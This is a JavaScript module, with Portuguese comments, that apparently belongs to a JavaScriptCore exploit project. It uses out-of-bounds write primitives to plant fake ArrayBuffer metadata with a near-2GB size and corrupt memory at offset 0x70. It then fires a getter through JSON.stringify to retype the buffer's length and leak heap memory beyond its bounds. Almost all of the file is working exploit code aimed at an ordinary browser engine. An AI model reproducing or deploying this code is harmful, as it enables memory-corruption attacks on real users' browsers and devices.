// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForLengthRetype";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Metadados sombra para tentar dar um tamanho GIGANTE ao oob_array_buffer_real
const FAKE_AB_CONTENTS_OFFSET = 0x0; // Onde plantaremos os metadados falsos no oob_array_buffer_real
const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Quase 2GB, alinhado
// O ponteiro de dados para os metadados sombra deve apontar para o início do buffer de dados real que queremos ler.
// Se queremos ler o próprio oob_array_buffer_real com um tamanho gigante, este ponteiro
// deve ser o endereço base do oob_array_buffer_real. Não podemos obtê-lo diretamente.
// Vamos tentar apontar para um offset relativo dentro do oob_array_buffer_real que a oob_dataview_real cobre.
// O mais simples é 0, se oob_write_absolute/oob_read_absolute já lidam com o byteOffset da oob_dataview_real.
// Se oob_array_buffer_real for usado diretamente por new Uint32Array, ele usa seu data pointer interno.
// A esperança é que este data pointer interno seja sobrescrito ou que o novo TypedArray use os metadados falsos.
// Para este teste, vamos definir o data_pointer como 0 relativo ao início do oob_array_buffer_real.
const FAKE_AB_DATA_POINTER = new AdvancedInt64(0x0, 0x0);


class CheckpointForLengthRetype {
    constructor(id) {
        this.id_marker = `LengthRetypeCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "LengthRetype_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando re-tipagem de length.", error: null, details: "" };

        let details_log = [];
        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Primitivas OOB ou oob_array_buffer_real não disponíveis no getter.");
            }

            // Re-plantar os metadados sombra DENTRO do getter, para garantir que estão frescos,
            // caso a escrita OOB em 0x70 ou o estado do motor os tenha alterado.
            // Isto assume que oob_write_absolute escreve relativo ao início do backingStore de oob_array_buffer_real.
            logS3("DENTRO DO GETTER: Re-plantando metadados sombra (tamanho gigante) no início do oob_array_buffer_real...", "info", FNAME_GETTER);
            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
            details_log.push(`Metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}, data_ptr=${FAKE_AB_DATA_POINTER.toString(true)}) re-plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET)}].`);

            // Tentativa Crítica: Criar um Uint32Array sobre o oob_array_buffer_real.
            // A esperança é que ele use os metadados falsos (especialmente FAKE_AB_HUGE_SIZE).
            logS3("DENTRO DO GETTER: Tentando 'new Uint32Array(oob_array_buffer_real)'...", "info", FNAME_GETTER);
            const large_reader = new Uint32Array(oob_array_buffer_real);
            
            details_log.push(`Uint32Array criado. Length reportado: ${large_reader.length}. oob_ab.byteLength original: ${oob_array_buffer_real.byteLength}.`);
            logS3(`DENTRO DO GETTER: large_reader.length: ${large_reader.length} (Esperado com re-tipagem: ${FAKE_AB_HUGE_SIZE.low() / 4})`, "info", FNAME_GETTER);

            if (large_reader.length === FAKE_AB_HUGE_SIZE.low() / 4) {
                current_test_results.success = true;
                current_test_results.message = `SUCESSO! oob_array_buffer_real RE-TIPADO para tamanho gigante! Length: ${large_reader.length}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                
                // Tentar ler um pouco além do limite original para confirmar OOB read no heap
                const original_u32_length = oob_array_buffer_real.byteLength / 4;
                const oob_read_index = original_u32_length + 100; // Ler 100 dwords além
                if (oob_read_index < large_reader.length) {
                    try {
                        const val = large_reader[oob_read_index];
                        details_log.push(`Leitura OOB em índice ${oob_read_index} retornou: ${toHex(val)}.`);
                        logS3(`DENTRO DO GETTER: Leitura OOB em large_reader[${oob_read_index}] = ${toHex(val)}`, "leak", FNAME_GETTER);
                    } catch (e_read_oob) {
                        details_log.push(`Erro na leitura OOB em índice ${oob_read_index}: ${e_read_oob.message}`);
                        logS3(`DENTRO DO GETTER: Erro na leitura OOB: ${e_read_oob.message}`, "error", FNAME_GETTER);
                        current_test_results.error = `Erro leitura OOB: ${e_read_oob.message}`;
                    }
                } else {
                    details_log.push(`Índice de leitura OOB (${oob_read_index}) fora do length re-tipado (${large_reader.length}).`);
                }
            } else {
                current_test_results.message = `Falha na re-tipagem de length. Length: ${large_reader.length}, esperado (sombra): ${FAKE_AB_HUGE_SIZE.low() / 4}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "warn", FNAME_GETTER);
            }

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro geral no getter: ${e.message}`;
        }
        current_test_results.details = details_log.join('; ');
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForLengthRetype.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_len_retype_test: true };
    }
}


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeLengthRetypeInGetterTest"; // Nome interno
    logS3(`--- Iniciando Teste de Re-Tipagem de Length no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        /* ... validação ... */ return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" com tamanho GIGANTE no início do oob_array_buffer_real
        // Esta escrita é crucial e acontece ANTES da escrita gatilho em 0x70
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
        logS3(`Metadados sombra (tamanho gigante) plantados: ptr=${FAKE_AB_DATA_POINTER.toString(true)}, size=${FAKE_AB_HUGE_SIZE.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
        const checkpoint_obj_for_len_retype = new CheckpointForLengthRetype(1);
        logS3(`CheckpointForLengthRetype objeto criado. ID: ${checkpoint_obj_for_len_retype.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_len_retype)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj_for_len_retype);
        } catch (e) { /* ... erro ... */ }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE RE-TIPAGEM LENGTH: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE RE-TIPAGEM LENGTH: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3(`  Detalhes da inspeção no getter: ${current_test_results.details}`, "info", FNAME_TEST);
    } else {
        logS3("RESULTADO TESTE RE-TIPAGEM LENGTH: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Re-Tipagem de Length no Getter Concluído ---`, "test", FNAME_TEST);
}
